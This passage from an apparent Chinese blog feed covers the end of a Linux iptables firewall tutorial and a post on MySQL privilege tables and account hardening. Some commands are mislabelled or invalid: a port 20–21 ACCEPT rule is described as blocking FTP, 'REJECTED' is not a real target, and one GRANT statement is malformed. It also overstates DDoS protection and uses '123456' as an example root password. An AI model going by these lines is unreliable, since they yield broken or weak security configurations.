title="规则表之间的默认优先级"></a>规则表之间的默认优先级</h3><p><code>raw&gt;mangle&gt;nat&gt;filter</code><br>规则链之间的默认优先级<br>入站：<code>PREROUTING&gt;INPUT</code><br>出站：<code>OUTPUT&gt;POSTROUTING</code><br>转发：<code>PREROUTING&gt;FORWARD&gt;POSTROUTING</code><br>规则链内的匹配顺序<br>按顺序依次检查，匹配即停止（LOG策略例外）<br>若找不到相匹配的规则，则按该链的默认策略处理，这跟路由转发还是有点区别的<br><a href="https://imgchr.com/i/PaIBb4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaIBb4.md.png" alt="PaIBb4.md.png"></a></p><p>整个基本流程大概就是这样，反正吧现在的网络环境一般都是只需要其中的一部分</p><h3 id="命令实现"><a href="#命令实现" class="headerlink" title="命令实现"></a>命令实现</h3><p>基本格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables  [-t 表名]  选项  [链名]  [条件]  [-j 控制类型]</span><br></pre></td></tr></table></figure><p>几个<code>注意事项</code><br>不指定表名时，默认指filter表<br>不指定链名时，默认指表内的所有链<br>除非设置链的默认策略，否则必须指定匹配条件<br>选项、链名、控制类型使用大写字母，其余均为小写</p><p>数据包的常见控制类型<br><code>ACCEPT</code>：允许通过<br><code>DROP</code>：直接丢弃，不给出任何回应<br><code>REJECT</code>：拒绝通过，必要时会给出提示<br><code>LOG</code>：记录日志信息，然后传给下一条规则继续匹配</p><p>添加新的规则,这里考虑到他的匹配规则必要的时候需要换一下命令<br><code>-A</code>：在链的末尾追加一条规则<br><code>-I</code>：在链的开头（或指定序号）插入一条规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp -j ACCEPT   直接在最后加入规则</span><br><span class="line">iptables -I INPUT 2 -p icmp -j ACCEPT 这样就是在第二条后面插入规则</span><br></pre></td></tr></table></figure><p>删除、清空规则<br><code>-D</code>：删除链内指定序号（或内容）的一条规则<br><code>-F</code>：清空所有的规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> iptables -F  清空所有规则</span><br><span class="line">iptables -D INPUT 3  删除第三条规则</span><br></pre></td></tr></table></figure><p>设置默认策略<br><code>-P</code>：为指定的链设置默认规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P FORWARD DROP  给FORWARD链默认设置DROP规则</span><br></pre></td></tr></table></figure><p>协议匹配：<code>-p</code> 协议名<br>地址匹配：<code>-s</code> 源地址、<code>-d</code> 目的地址<br>接口匹配：<code>-i</code> 入站网卡、<code>-o</code> 出站网卡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -p ! icmp -j ACCEPT  这条命令的意思就是除了icmp协议之外的所有协议都ACCEPT</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 10.20.30.0/24 -j DROP  这条命令的意思就是把来自10.20.30.0这一个网段的包全都丢掉，有效防止了DDOS攻击</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP </span><br><span class="line">iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP</span><br><span class="line">iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP</span><br></pre></td></tr></table></figure><p>上面这三条命令也很有实际意义，假设有人恶意串改了源地址，同时把这个包发送到内网，内网的机子会对这种包做出响应，此时源地址变成目的地址，就会直接在内网里面一个个尝试对应IP从而可以攻击内网的机子，因为这种源IP是内网地址的是不可能出现在互联网上的，理所当然应该禁止</p><p>端口匹配：<code>--sport</code>源端口、<code>--dport</code> 目的端口<br>TCP标记匹配：<code>--tcp-flags</code> 检查范围 被设置的标记<br>ICMP类型匹配：<code>--icmp-type</code> ICMP类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -s 192.168.4.0/24 -p udp --dport 53 -j ACCEPT   对于192.168.4.0这个网段的DNS服务开启做相应规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 20:21 -j ACCEPT 禁止FTP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -j DROP</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT</span><br></pre></td></tr></table></figure><p>这就是我前面讲的对应自己ping别人可收到响应报文，别人却ping不到你，有效降低你被别人攻击的可能</p><p>再来看看一个例子<br>输入命令<code>iptables -t filter -I INPUT -p icmp -j REJECTED</code><br>这条命令是对进入的数据包进行icmp所有协议包进行过滤，需要注意两点第一，控制类型不一样返回的效果也不一样，第二对于icmp这种类型的报文而言，响应包跟请求包都被截了，后面会讲到如何可以接受icmp响应包而不接受请求包<br>然后尝试ping一下对面的机子，这是拒绝(REJECT)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIsa9.png" alt="PaIsa9.png"></p><p>这是直接丢弃(DROP)的效果<br><img src="https://s1.ax1x.com/2018/07/29/PaIy5R.png" alt="PaIy5R.png"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本来还想写写Windows下的防火墙，但由于是图形化界面，学起来也容易上手，就没写了，我比较懒~~~运用好防火墙，可以隐藏你自己的IP地址，减少被攻击的可能性，在生活中大有用处。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Linux下&lt;code&gt;iptables&lt;/code&gt;的设置，设置了它就能够有效地过滤掉相关的数据包从而阻挡相关攻击，感觉这个东西跟安全有很大用处，比如在我们学习的计算机网络知识里面，网络拓扑十分瓜皮，路由器没有过滤数据包的功能，直接就实现路由转发的过程，这样就会对一个LAN造成很大的安全隐患，
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="Linux安全" scheme="0verwatch.top/tags/Linux%E5%AE%89%E5%85%A8/"/>
    
      <category term="服务器运维" scheme="0verwatch.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Mysql安全配置</title>
    <link href="0verwatch.top/Mysql-security-1.html"/>
    <id>0verwatch.top/Mysql-security-1.html</id>
    <published>2018-07-26T12:35:31.000Z</published>
    <updated>2018-07-26T12:37:15.855Z</updated>
    
    <content type="html"><![CDATA[<p>mysql中存在4个控制权限的表，分别为<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql.USER表</span><br><span class="line">2. mysql.DB表</span><br><span class="line">3. mysql.TABLES_PRIV表</span><br><span class="line">4. mysql.COLUMNS_PRIV表</span><br></pre></td></tr></table></figure><p>要注意的是，Mysql中有一个数据库”<code>information_schema</code>“，似乎里面保存的也是一些权限信息，但是要明白的是，这个数据库”<code>information_schema</code>“是为系统管理员提供元数据的一个简便方式，它实际上是一个视图，可以理解为对Mysql中的一个信息的封装，对于Mysql主程序来说，身份认证和授权的信息的来源只有一个，就是”<code>mysql</code>“。</p><p>在我们进行数据库连接、登录的时候，mysql权限表的验证过程为：</p><ol><li>先从user表中的:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) Host</span><br><span class="line">2) User</span><br><span class="line">3) Password</span><br></pre></td></tr></table></figure><p>这3个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。</p><ol start="2"><li>通过身份认证后，进行权限分配，按照下面的顺序进行验证。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1) user</span><br><span class="line">2) db</span><br><span class="line">3) tables_priv</span><br><span class="line">4) columns_priv</span><br></pre></td></tr></table></figure><p>即先检查全局权限表user，如果user中对应的权限为Y，则此用户对所有数据库的权限都为Y，将<code>不再</code>检查<code>db，tables_priv,columns_priv</code><br>如果全局权限表<code>user</code>对应的权限为<code>N</code>，则到db表中检查此用户对应的具体数据库，并得到db中为Y的权限<br>如果db中为N，则检查<code>tables_priv</code>中此数据库对应的具体表，取得表中的权限Y，以此类推。逐级下降</p><p>用自己的话讲就是因为查找他们权限是否配置好根据情况查看<code>mysql</code>这个数据库中的<code>user，db，tables_priv，columns_pri</code>，一旦在某个级别设置好了权限就不需要网下一级去看他是否存在权限了，因为下面一级的表都不会显示，这是为了防止数据库数据冗余。就是例如你设置的是所有数据库及表的权限的话，到时候就直接<code>select * from user;</code>就可以查看对应的程序啦<br><a href="https://imgchr.com/i/PNNSfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/26/PNNSfK.md.png" alt="PNNSfK.md.png"></a></p><p>对于Mysql中的账户权限相关的安全配置，总结如下：</p><ol><li>针对每个网站建立一个单独的账户</li><li>为每个网站单独建立一个专属数据库(虽然DEDE、DZ普通采用表前缀的方法来实现”一库多站”，但好的做法还是”一库一站”)</li><li>按照<code>user-&gt;db-&gt;tables_priv-&gt;columns_pri</code>的顺序进行细粒度的权限控制</li><li>为每个用户单独配置一个专属数据库，保证当前用户的所有操作只能发生在它自己的数据库中，防止SQL注入发生后，黑客通过注入点访问到系统表</li></ol><p>账户权限安全配置需要的常用命令<br>1)新建一个用户并给予相应数据库的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete,create,drop privileges on 数据库名字.表名 to user@localhost identified by 'passwd';    //如果是*号就是代表全部*.*代表所有数据库下的全部表名</span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.* <span class="keyword">to</span> <span class="keyword">user</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'passwd'</span>;</span><br></pre></td></tr></table></figure><p>2) 刷新权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p>3)显示授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span>;  //这句话只显示当前登录用户的权限</span><br></pre></td></tr></table></figure><p>4) 移除授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">delete</span> <span class="keyword">on</span> *.* <span class="keyword">from</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure><p>5) 删除用户<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p>6) 给用户改名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">user</span> <span class="string">'jack'</span>@<span class="string">'%'</span> <span class="keyword">to</span> <span class="string">'jim'</span>@<span class="string">'%'</span>;``</span><br></pre></td></tr></table></figure></p><p>7) 给用户改密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> = <span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mysql中存在4个控制权限的表，分别为
    
    </summary>
    
      <category term="Mysql安全配置" scheme="0verwatch.top/categories/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Mysql安全配置" scheme="0verwatch.top/tags/Mysql%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
</feed>
